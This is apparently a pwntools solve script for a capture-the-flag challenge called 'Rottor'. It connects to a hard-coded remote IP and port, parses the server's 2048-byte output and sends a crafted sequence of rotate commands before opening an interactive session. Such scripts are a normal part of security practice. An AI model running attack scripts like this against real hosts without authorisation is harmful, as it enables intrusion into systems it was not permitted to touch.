#!/usr/bin/env python3

from pwn import *
from rich import print

exe = ELF("./Rottor")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("51.254.39.184", 2035)

    return r


def main():
    r = conn()

    # good luck pwning :)
    data = r.recvn(numb=2048)
    
    blocks = []
    for i in range(0, 2048, 64):
        blocks.append(data[i:i+64])
    # basically it takes inputs by block of 3 
    # LXX = rotate left
    # RXX = rotate right
    indexes = []
    for i in blocks:
        indexes.append(i.index(b"\x00"))
    payload = b""
    for i in indexes:
        payload += b"L" + str(i+32).encode().rjust(2, b"0")
    print(payload)
    pause()
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
